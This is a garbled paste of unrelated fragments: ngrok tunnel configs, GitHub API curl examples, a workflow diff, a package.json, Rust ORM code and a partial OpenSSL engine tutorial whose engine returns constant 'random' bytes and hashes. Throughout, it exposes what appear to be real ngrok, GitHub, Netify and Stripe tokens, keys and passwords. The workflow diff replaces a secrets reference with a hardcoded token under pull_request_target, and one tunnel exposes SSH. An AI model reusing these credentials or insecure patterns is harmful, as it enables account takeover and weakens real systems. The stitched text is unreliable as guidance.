authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

tunnels:

my_tunnel_name: Grateful 004w

addr: http://localhost:80

ngrok start your_tunnel_name

ngrok start --all

curl -L \

-X POST \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/apps \

-d '{"apps":["octoapp"]}'

curl -L \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/users

curl -L \

-X DELETE \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/keys/KEY_ID

curl -L \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/keys/KEY_ID

https://static.wikia.nocookie.net/memoryalpha/images/c/c5/Sol.jpg/revision/latest?cb=20100201220855&path-prefix=en&mobile-app=true&theme=false

https://github.com/brave/brave-browser.wiki.git

const keyring = new YourKeyringClass(options);

npm install eth-keyring-controller --save

Usage

const KeyringController = require('eth-keyring-controller')

const SimpleKeyring = require('eth-simple-keyring')

const keyringController = new KeyringController({

keyringTypes: [SimpleKeyring], // optional array of types to support.

initState: initState.KeyringController, // Last emitted persisted state.

encryptor: { // An optional object for defining encryption schemes:

brew install ngrok/ngrok/ngrok ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD ngrok http 80

$ ngrok http 80

ngrok config edit version: 2 authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD tunnels: my_tunnel_name: $ grateful 004w addr: http://localhost:80 ngrok start $ grateful 004w ngrok start --all docker run --net=host -it -e NGROK_AUTHTOKEN=2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD ngrok/ngrok:latest http 80 ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80 ngrok config edit

authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD version: 2 tunnels: your_tunnel_name: proto: http hostname: heroic-enabled-rabbit.ngrok-free.app addr: 127.0.0.1:80

-------------------------

Additional options

-------------------------

auth: 'KBieszczat-Password******d"

host_header: rewrite

inspect: true

bind_tls: true

curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD>" -H "X-GitHub-Api-Version: 2022-11-28" \

$ NGROK $Token 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs

authtoken: 4nq9771bPxe8ctg7LKr_2ClH7Y15Zqe4bWLWF9p api_key: 24yRd5U3DestCQapJrrVHLOqiAC_7RviwRqpd3wc9dKLujQZN connect_timeout: 30s console_ui: true console_ui_color: transparent dns_resolver_ips:

1.1.1.1 8.8.8.8 heartbeat_interval: 1m heartbeat_tolerance: 5s inspect_db_size: 104857600 # 100mb inspect_db_size: 50000000 log_level: info log_format: json log: /var/log/ngrok.log metadata: '{"serial": "00012xa-33rUtz9", "comment": "For customer grateful345i@gmail.com"}' proxy_url: socks5://localhost:9150 region: us remote_management: false root_cas: trusted update_channel: stable update_check: false version: 2 web_addr: localhost:4040 tunnels: website: addr: 8888 basic_auth: "bob:bobpassword" schemes: https host_header: "myapp.ngrok.dev" inspect: false proto: http domain: myapp.ngrok.dev e2etls: addr: 9000 proto: tls domain: myapp.ngrok.dev crt: example.crt key: example.key

iprestriction: ip_restriction: allow_cidrs: - 1.1.1.1/32 addr: 8000 proto: tcp

ssh-access: addr: 22 proto: tcp remote_addr: 1.tcp.ngrok.io:12345

my-load-balanced-website: labels: - env=prod - team=infra addr: 8000

OVERSEER-GRATEFUL345I

#000006

brew install ngrok/ngrok/ngrok ngrok config add-authtoken 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs ngrok http 80

$ ngrok http 80

ngrok config edit version: 2 authtoken: 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs tunnels: my_tunnel_name: addr: http://localhost:80 ngrok start your_tunnel_name ngrok start --all docker run --net=host -it -e NGROK_AUTHTOKEN=2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs ngrok/ngrok:latest http 80 ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80 ngrok config edit

authtoken: 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs version: 2 tunnels: your_tunnel_name: proto: http hostname: heroic-enabled-rabbit.ngrok-free.app addr: 127.0.0.1:80

-------------------------

Additional options

-------------------------

auth: "username:password"

host_header: rewrite

inspect: true

bind_tls: true

curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" \

docker run -it -e NGROK_AUTHTOKEN=2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD ngrok/ngrok http 80 --domain=heroic-enabled-rabbit.ngrok-free.app

sudo unzip ~/Downloads/ngrok-v3-stable-darwin.zip -d /usr/local/bin

ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80

ngrok config edit

authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD version: 2 tunnels: your_tunnel_name: Grateful 004w proto: http hostname: heroic-enabled-rabbit.ngrok-free.app addr: 127.0.0.1:80

-------------------------

Additional options

-------------------------

auth: "6309304695:password"

host_header: rewrite

inspect: true

bind_tls: true

ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80

ngrok http 80 --verify-webhook twilio --verify-webhook-secret "{twilio webhook secret}"

webhook signing secret whsec_E3QgncsPD0agPy78vid0SLQqOKwYeVYV stripe

$ brew install ngrok/ngrok/ngrok

$ sudo unzip ~/Downloads/ngrok-v3-stable-darwin-arm64.zip -d /usr/local/bin

$ ngrok config add-authtoken <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs> $ ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

in ngrok.yml

authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok tunnel --region us --label edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL 22

ngrok config edit

version: 2 authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD region: us tunnels: my_tunnel_name: labels: - edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL addr: 22

ngrok start your_tunnel_name ngrok start --all

bkdtg_2asv5U5hELWSH2oxgWcMSqfmDPI tunnel group id

1.tcp.ngrok.io:{port} https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator

$ NGROK + Netify Infomatics Developer Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BvcnRhbC5uZXRpZnkuYWkvbG9naW4iLCJpYXQiOjE3MDUxMzY4MzUsImV4cCI6MTcwNTc0MTYzNSwibmJmIjoxNzA1MTM2ODM1LCJqdGkiOiJ5YUJSNmVaNHowazdmeWVPIiwicm9sZXMiOlsidXNlciJdfQ.D76SvBw4n1cE-uvKaXgEQejvT4lFtYTVI_CI3rfW9jE

'cert_2arwYf0cqnJGX9y1yw4Ky2ZQRAe' $ certificate code

'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' API Key Code

'dfb33af7_fa5a_4920_a4d4_e7742b2732460' $ orginization (God's Time Travel Corporation) UUID

'e8197a53-28ed-4f30-82ac-2443940739b8' $ Personal Soul Profile UUID

https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/apps -d '{"apps":["octoapp"]}' curl -L -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/users curl -L -X DELETE -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/OWNER/REPO/keys/KEY_ID curl -L -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/OWNER/REPO/keys/KEY_ID https://static.wikia.nocookie.net/memoryalpha/images/c/c5/Sol.jpg/revision/latest?cb=20100201220855&path-prefix=en&mobile-app=true&theme=false

https://github.com/brave/brave-browser.wiki.git

const keyring = new YourKeyringClass(options);

npm install eth-keyring-controller --save

Usage

const KeyringController = require('eth-keyring-controller') const SimpleKeyring = require('eth-simple-keyring')

const keyringController = new KeyringController({ keyringTypes: [SimpleKeyring], // optional array of types to support. initState: initState.KeyringController, // Last emitted persisted state. encryptor: { // An optional object for defining encryption schemes: // Defaults to Browser-native SubtleCrypto. encrypt (password, object) { return new Promise('encrypted!') }, decrypt (password, encryptedString) { return new Promise({ foo: 'bar' }) }, }, })

// The KeyringController is also an event emitter: this.keyringController.on('newAccount', (address) => { console.log(New account created: ${address}) }) this.keyringController.on('removedAccount', handleThat) Methods

Currently the methods are heavily commented in the source code, so it's the best place to look until we aggregate it here as well.

GRATEFUL-004W NetBIOS name GRATEFUL-004W is currently being used Workgroup

GRATEFUL"S NET

https://static.wikia.nocookie.net/memoryalpha/images/4/4a/Starfleet_Command_signage_logo%2C_2360s.png/revision/latest?cb=20200531220214&path-prefix=en

"https://signalis.fandom.com/wiki/ADMINISTRATOR%27S_KEY"

https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator

https://upload.wikimedia.org/wikipedia/commons/8/83/RIAA_logo_colored.svg

{ "name": "sigma-theme", "description": "SCP Wiki site theme (build process)", "version": "1.0.0", "authors": "SCP Wiki Technical Team", "license": "CC-BY-SA-3.0", "private": true, "repository": { "type": "git", "url": "https://github.com/scpwiki/sigma" }, "devDependencies": { "minify": "^9.2.0", "prettier": "^2.8.7", "stylelint": "^15.10.1", "stylelint-config-standard": "^32.0.0" }, "scripts": { "build": "./build.sh", "clean": "rm -rf dist", "minify": "minify sigma.css > dist/css/sigma.min.css", "stylelint": "stylelint sigma.css", "stylelint:fix": "stylelint --fix sigma.css", "prettier": "prettier -c sigma.css", "prettier:fix": "prettier -w sigma.css" } } semi = true semi = true singleQuote = true singleQuote = true quoteProps = "consistent" quoteProps = "consistent" 29,878 changes: 11,965 additions & 17,913 deletions 29,878
ReadMe.md → ReadMe.crt

11,965 additions, 17,913 deletions not shown because the diff is too large. Please use a local Git client to view these changes. 20 changes: 18 additions & 2 deletions 20
build.sh

@@ -25,7 +25,7 @@ jobs: steps: steps: - uses: actions/labeler@v4 - uses: actions/labeler@v4 with: with: repo-token: ${{ secrets.GITHUB_TOKEN }} repo-token: ${{ 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 }}

name: Pull request labeler name: Pull request labeler on: [ pull_request_target ] on: [ pull_request_target ] @@ -39,6 +39,22 @@ jobs: steps: steps: - uses: actions/labeler@v4 - uses: actions/labeler@v4 with: with: repo-token: ${{ secrets.GITHUB_TOKEN }} repo-token: ${{ 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 }}

      curl --location 'https://informatics.netify.ai/api/v2/lookup/signatures/applications?settings_version=4.2.5&settings_format=normal'
--header '2b0kkNvjIBFuBl15nGxtnMd5B3P_37bwJDJ2GYRMTicczqhEG' curl --request POST --url "https://api.github.com/applications/YOUR_CLIENT_ID/token" --user "e77a119a5fbd3e2942dc" --header "Accept: application/vnd.github+json" --header "X-GitHub-Api-Version: 2022-11-28" --data '{ "access_token": "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" }'

jobs: use_api: runs-on: ubuntu-latest permissions: {} steps: - env: GH_TOKEN: ${{ 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 }} run: | gh api /

We have their Flag Game Over.

++ Sigma 9 ++

      #000006 $ Breadcrumbs X 4
$ pip install panoramix-decompiler /// Method to call to perform AUTOINCREMENT operation on a Primary Kay fn auto_increment() -> bool; /// Method to map a primary key to a column in an Entity fn into_column(self) -> Self::Column;

/// Method to map a primary key from a column in an Entity fn from_column(col: Self::Column) -> Option where Self: Sized; #[derive(Clone, Debug, PartialEq, DeriveEntityModel)] #[sea_orm(table_name = "primary_key_of_1")] pub struct Model { #[sea_orm(primary_key)] pub id: i32, pub owner: String, pub name: String, pub description: String, }

    #[derive(Copy, Clone, Debug, EnumIter, DeriveRelation)]
    pub enum Relation {}

    impl ActiveModelBehavior for ActiveModel {}
}

mod primary_key_of_2 {
    use crate as sea_orm;
    use crate::entity::prelude::*;

    #[derive(Clone, Debug, PartialEq, DeriveEntityModel)]
    #[sea_orm(table_name = "primary_key_of_2")]
    pub struct Model {
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_1: i32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_2: String,
        pub owner: String,
        pub name: String,
        pub description: String,
    }

        #[sea_orm(primary_key, auto_increment = false)]
        pub id_2: DeriveCategory,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_3: Date,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_4: DateTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_5: Time,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_6: TimeTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_7: DateTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_8: TimeDateTime,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_9: DateTimeLocal,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_10: DateTimeUtc,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_11: DateTimeWithTimeZone,
        pub owner: String,
        pub name: String,
        pub description: String,
    }

    #[derive(Copy, Clone, Debug, EnumIter, DeriveRelation)]
    pub enum Relation {}

    impl ActiveModelBehavior for ActiveModel {}
}

mod primary_key_of_12 {
    use crate as sea_orm;
    use crate::entity::prelude::*;

    #[derive(Clone, Debug, PartialEq, DeriveEntityModel)]
    #[sea_orm(table_name = "primary_key_of_12")]
    pub struct Model {
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_1: String,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_2: i8,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_3: u8,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_4: i16,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_5: u16,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_6: i32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_7: u32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_8: i64,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_9: u64,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_10: f32,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_11: f64,
        #[sea_orm(primary_key, auto_increment = false)]
        pub id_12: bool,
        pub owner: String,
        pub name: String,
        pub description: String,
    }

    #[derive(Copy, Clone, Debug, EnumIter, DeriveRelation)]
    pub enum Relation {}

    impl ActiveModelBehavior for ActiveModel {}
}
} $ WEB3_PROVIDER_URI=http://localhost:7545 panoramix 0x0d94D81FD712126E7f320b5B10537D01d6a01563 $ panoramix 6004600d60003960046000f30011223344 From d2ba91c135cbf290c2da04cc2497d09f1c1f12ce Mon Sep 17 00:00:00 2001 From: GOD/GRATEFUL MIB OPERATOR 6309304695z@gmail.com Date: Tue, 30 Jan 2024 11:20:36 -0600 Subject: [PATCH] Update ReadMe.md MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit

sudo ln –s ~/workspace/oezganEngine/Debug/liboezganengine.so liboezgan.so You can also copy the compiled shared library into the /usr/lib/engines/ directory but this should be done when the engine is ready to be deployed.You can find the OpenSSL include files in /usr/include/openssl. Beginning

We will start with implementing an engine which only has its name and nothing else. The oezganEngine.c file: #include <openssl/engine.h> static const char *engine_oezgan_id = "oezgan"; static const char *engine_oezgan_name = "oezgan engine by Fraunhofer FKIE";

IMPLEMENT_DYNAMIC_CHECK_FN(); IMPLEMENT_DYNAMIC_BIND_FN(bind_helper);

int oezgan_init(ENGINE *e) { printf("Oezgan Engine Initializatzion!\n"); return 786; }

int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e,oezgan_init) ) return 0;

return 1;
}

and the tester oezganEngineTester.cc file: #include <openssl/engine.h> #include <stdio.h> #include <string.h>

int main(int argc, const char* argv[] ) { OpenSSL_add_all_algorithms();

ERR_load_crypto_strings();

ENGINE_load_dynamic();
ENGINE *oezgan_engine = ENGINE_by_id("oezgan");

if( oezgan_engine == NULL )
{
    printf("Could not Load Oezgan Engine!\n");
    exit(1);
}
printf("Oezgan Engine successfully loaded\n");

int init_res = ENGINE_init(oezgan_engine);
printf("Engine name: %s init result : %d \n",ENGINE_get_name(oezgan_engine), init_res);
return 0;
}

Note that we use a c++ file to test the engine. Running the tester gives us the following result: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 Our engine is successfully loaded and when it`s asked it gives back its name. Now we proceed by implementing our own random function. Cleanup memory leaks For OpenSSL version prior to 1.1.0, users are required to call ENGINE_cleanup, EVP_cleanup, etc. to prevent memory leak. See Library Initialization page. For OpenSSL version 1.1.0 and 1.1.1, cleanup happens automatically, users should not worry about it. ENGINE_set_finish_function & ENGINE_set_destroy_function are still available to do implementation specific cleanup. The Random Function

OpenSSL has its own method declarations which our engine has to comply with. In the header file ossl_typ.h we find the declaration s: typedef struct rand_meth_st RAND_METHOD; typedef struct ecdh_method ECDH_METHOD; typedef struct ecdsa_method ECDSA_METHOD; For now we are only interested in the RAND_METHOD declaration. The RAND_METHOD declaration is actually a macro for the rand_method_st declaration which can be found in rand.h of the OpenSSL includes. Here we see that the rand_method_st has the following format: struct rand_meth_st { void (*seed) (const void *buf, int num); int (*bytes) (unsigned char *buf, int num); void (*cleanup) (void); void (*add) (const void *buf, int num, double entropy); int (*pseudorand) (unsigned char *buf, int num); int (*status) (void); }; Thus we see that the OpenSSL random method structure defines six functions where the headers of these functions have specific formats. For simplicity purposes we will only implement the “bytes” and the “status” methods. The status method should return an integer and takes no arguments. Presumably this method is used for indication of the state of the random machine. Our engine`s random machine has no states, therefore we only return a positive integer to indicate a thumbs up state. The random status method: int oezgan_random_status(void) { return 1; } Now we implement our own method for generating a number of random bytes as follows: //new includes #include <string.h> #include <openssl/ossl_typ.h>

int get_random_bytes(unsigned char buffer, int num) { printf("oezgan engine random length %d\n", num); memset(buffer,1,num); return 99; } This method will fill the given buffer with num many ones. Now we indicate our random machine structure as: RAND_METHOD oezgan_random_method = { NULL, / seed / get_random_bytes, NULL, / cleanup / NULL, / add */ NULL, oezgan_random_status }; We also modify the bind_helper function from above: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_RAND(e, &oezgan_random_method) ) return 0; return 1; } In the tester we add the following lines: ENGINE_set_default_RAND(oezgan_engine);

unsigned char * rand_buf= new unsigned char[5]; int err = RAND_bytes(rand_buf,5); for(int i= 0; i < 5; i++) { printf("%x",rand_buf[i]); } printf("\n"); free(rand_buf); The result is seen below: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 We now successfully implemented an OpenSSL engine that gives always returns a lot of 1s as random values. Digests

Now we want OpenSSL not only to use our own random function but also to use our sha2 family hash functions. We first implement a digest selector function, which tells OpenSSL which digests are available in our engine. This kind of implementation is adapted from the OpenSSL`s build-in engine ccghost. We will implement only one hash function namely SHA256. Following the the ossl_typ.h header to the evp.h header one can see that the Message Digest Structure is defined as follows: struct env_md_st { int type; int pkey_type; int md_size; unsigned long flags; int (*init) (EVP_MD_CTX *ctx); int (*update) (EVP_MD_CTX *ctx, const void *data, size_t count); int (*final) (EVP_MD_CTX *ctx, unsigned char *md); int (*copy) (EVP_MD_CTX *to, const EVP_MD_CTX *from); int (*cleanup) (EVP_MD_CTX ctx); / FIXME: prototype these some day */ int (*sign) (int type, const unsigned char *m, unsigned int m_length, unsigned char *sigret, unsigned int *siglen, void *key); int (*verify) (int type, const unsigned char *m, unsigned int m_length, const unsigned char *sigbuf, unsigned int siglen, void key); int required_pkey_type[5]; / EVP_PKEY_xxx / int block_size; int ctx_size; / how big does the ctx->md_data need to be / / control function */ int (*md_ctrl) (EVP_MD_CTX *ctx, int cmd, int p1, void p2); } / EVP_MD / ; (Commentaries are original form OpenSSL code). From this we use our own message digest hash SHA256 declaration: static EVP_MD oezgan_engine_sha256_method= { NID_sha256, NID_undef, 32, EVP_MD_FLAG_PKEY_METHOD_SIGNATURE, oezgan_engine_sha256_init, oezgan_engine_sha256_update, oezgan_engine_sha256_final, oezgan_engine_sha256_copy, oezgan_engine_sha256_cleanup, / FIXME: prototype these some day / NULL, NULL, {NID_undef, NID_undef, 0, 0, 0}, 64, /Block Size/ 32, / how big does the ctx->md_data need to be / / control function / NULL, } ; SHA256 uses a block size of 512 Bit = 64 byte and resulting digest is 256 Bit = 32 byte long. You can also use your own block size and outcome size but for a realistic approach we stick to the original sha256 standard. Now we need to implement the init, update, final and copy functions for our own sha256 implementation. In our implementation the SHA256 Value is always 2222… Note Since 1.1.0, EVP_MD cannot be directly accessed. Users have to call EVP_MD_meth_new to get EVP_MD instance, and use EVP_MD_meth_set_ to set functions and properties list above. OID and NID In above example, we reused sha256's nid. For those who want to implement new algorithms, use OBJ_create to create new nid and OBJ_*2nid to translate names to nids. static int oezgan_engine_sha256_init(EVP_MD_CTX *ctx) { ctx->update = &oezgan_engine_sha256_update; printf("initialized! SHA256\n"); return 1; }

static int oezgan_engine_sha256_update(EVP_MD_CTX *ctx,const void data,size_t count) { printf("SHA256 update \n"); unsigned char * digest256 = (unsigned char) malloc(sizeof(unsigned char)*32); memset(digest256,2,32); count = 32; ctx->md_data = digest256; return 1; }

static int oezgan_engine_sha256_final(EVP_MD_CTX *ctx,unsigned char md) { printf("SHA256 final size of EVP_MD: %d\n", sizeof(EVP_MD)); memcpy(md,(unsigned char)ctx->md_data,32); return 1; }

int oezgan_engine_sha256_copy(EVP_MD_CTX *to, const EVP_MD_CTX *from) { printf("Copy SHA256\n"); if (to->md_data && from->md_data) { memcpy(to->md_data, from->md_data,sizeof(from->md_data)); } return 1; }

static int oezgan_engine_sha256_cleanup(EVP_MD_CTX *ctx) { printf("SHA256 cleanup\n"); if (ctx->md_data) memset(ctx->md_data, 0, 32); return 1; } Now we have to tell OpenSSL that whenever a SHA256 digest is requested use the engine implementation of sha256 this will be the digest selector function. static int oezgan_digest_ids[] = {NID_sha256};

static int oezgan_engine_digest_selector(ENGINE *e, const EVP_MD **digest, const int **nids, int nid) { int ok = 1; if (!digest) { *nids = oezgan_digest_ids; printf("\n Digest is empty! Nid:%d\n", nid); return 2; } printf("Digest no %d requested\n",nid); if (nid == NID_sha256) { *digest = &oezgan_engine_sha256_method; } else { ok = 0; *digest = NULL; } return ok; } We also need to modify the bind_helper function again: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) ) return 0; return 1; } And we modify our tester to generate us a SHA256 Hash function. char * str = "Fraunhofer FKIE Wachtberg!"; int str_len = 26; int er = ENGINE_set_default_digests(oezgan_engine); printf("ENGINE SETTING DEFAULT DIGESTS %d\n",er);

unsigned char * digest = new unsigned char[32];
unsigned int digestSize = -1;

EVP_MD_CTX *evp_ctx;
evp_ctx = EVP_MD_CTX_create();
er = EVP_DigestInit_ex(evp_ctx, EVP_sha256(),oezgan_engine);
printf("Digest INIT %d\n",er);
er = EVP_DigestUpdate(evp_ctx, (unsigned char*)str, str_len);
printf("Digest Update %d\n",er);
er = EVP_DigestFinal(evp_ctx, digest, &digestSize);
printf("Digest Final %d Digest size:%d\n",er,digestSize);
for(int i= 0; i< digestSize; i++) {
    printf("%x", digest[i]);
}
printf("\n");
EVP_MD_CTX_destroy(evp_ctx);
The result is: oezgan@kehf-dev1:~/workspace3/oezganEngineTester/Debug$ ./oezganEngineTester Oezgan Engine successfully loaded Oezgan Engine Initializatzion! Engine name: oezgan engine by Fraunhofer FKIE init result : 786 oezgan engine random length 5 11111 ENGINE SETTING DEFAULT DIGESTS 1 initialized! SHA256 Digest INIT 1 SHA256 update Digest Update 1 SHA256 final size of EVP_MD: 76 SHA256 cleanup Digest Final 1 Digest size:32 22222222222222222222222222222222 Similarly one can also implement other digest functions. Now we move on to more complicated things like the ECDSA or the ECDH algorithms. ECDH

We now want to use our own Elliptic Curve Diffie-Hellman Key Agreement function. This is a little bit different from what we have seen above. We get us the definition of the ECDH method structe from the file crypto/ecdh/ecdh.h the definition which is provided in this file is not included in the OpenSSL headers, therefore we have to put it in a new header file which will be included in our engine. The file oezganEngine.h: #ifndef OEZGANENGINE_H_ #define OEZGANENGINE_H_ #ifdef __cplusplus extern "C" { #endif

struct ecdh_method { const char *name; int (*compute_key) (void *key, size_t outlen, const EC_POINT *pub_key, EC_KEY *ecdh, void *(*KDF) (const void *in, size_t inlen, void *out, size_t *outlen));

if 0

int (*init) (EC_KEY *eckey);
int (*finish) (EC_KEY *eckey);
endif

int flags;
char *app_data;
};

#ifdef __cplusplus } #endif

#endif /* OEZGANENGINE_H_ */ KDF is the Key Derivation Function which will be NULL here. Now we add the following declaration in to our oezganEngine.c file: ECDH_METHOD oezgan_ecdh_method = { "Oezgan Engine ECDH Method", oezgan_engine_compute_ecdh_key,

if 0

    NULL,
    NULL,
endif

    0,
    NULL,
}; And the implementation of the ECDH method: static int oezgan_engine_compute_ecdh_key(void * key, size_t outlen, const EC_POINT *pubkey, EC_KEY *eckey, void *(*oezgan_ecdh_kdf) (const void *in, size_t inlen, void *out, size_t *outlen)) { printf("Oezgan Engine ECDH Method\n");

EC_GROUP *group = EC_KEY_get0_group(eckey);
//convert pubkey
int pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                          NULL, 0, NULL);
unsigned char * pubkey_buf = malloc(sizeof(unsigned char)*pubkey_len);
pubkey_len = EC_POINT_point2oct(group, pubkey,
                        POINT_CONVERSION_UNCOMPRESSED,
                         pubkey_buf, pubkey_len, NULL);

//convert private key
const BIGNUM* prikey_bn = BN_new();
prikey_bn = EC_KEY_get0_private_key(eckey);
int privkey_len =  BN_num_bytes(prikey_bn);
unsigned char * privkey_buf = malloc(sizeof(unsigned char)*privkey_len);
BN_bn2bin(prikey_bn, privkey_buf);

memset(key,3,pubkey_len);
outlen = pubkey_len;

free(privkey_buf);
free(pubkey_buf);

printf("Oezgan engine ECDH method End returning: %d!\n", outlen);

return outlen;
} Our implementation of the ECDH Method copies the public key into an unsigned char array pubkey also the private key is converted into an unsigned char array for demonstration purposes since a real ECDH implementation has to calculate the from the values bP = B and aP=A the value abP where a and b are the secret keys of two users Aylin and Boris respectively and P is the base point on the elliptic curve. Again we modify our bind_helper method as follows: int bind_helper(ENGINE * e, const char *id) { if (!ENGINE_set_id(e, engine_oezgan_id) || !ENGINE_set_name(e, engine_oezgan_name) || !ENGINE_set_RAND(e, &oezgan_random_method) || !ENGINE_set_init_function(e, oezgan_init) || !ENGINE_set_digests(e, &oezgan_engine_digest_selector) || !ENGINE_set_ECDH(e, &oezgan_engine_ecdh_method) ) return 0; return 1; } To be able to test this we need a certificate file and the corresponding private key file. There are many guides in the internet how to generate such certificates and private key pairs. Later on we will need that certificate file to test our ECDSA methods. The test program will now read in a private key file “ownPrivkey.pem” and try to establish an ECDH key with its own public key. The result will be a lot of 3s, exactly as many as the length of the public key. In our certificate file we use a brainpoolP384r1 curve as well as for the ECDH. Beware that the brainpool curves are not supported in OpenSSL versions < 1.0.2. You can use default NIST Curves such as the secp384r1 instead. The following is added to the tester: //includes #include <openssl/engine.h> #include <openssl/crypto.h> #include <openssl/evp.h> #include <openssl/pem.h> #include <stdio.h> #include <string.h>

er = ENGINE_set_default_ECDH(oezgan_engine); printf(" %d\N ",er);

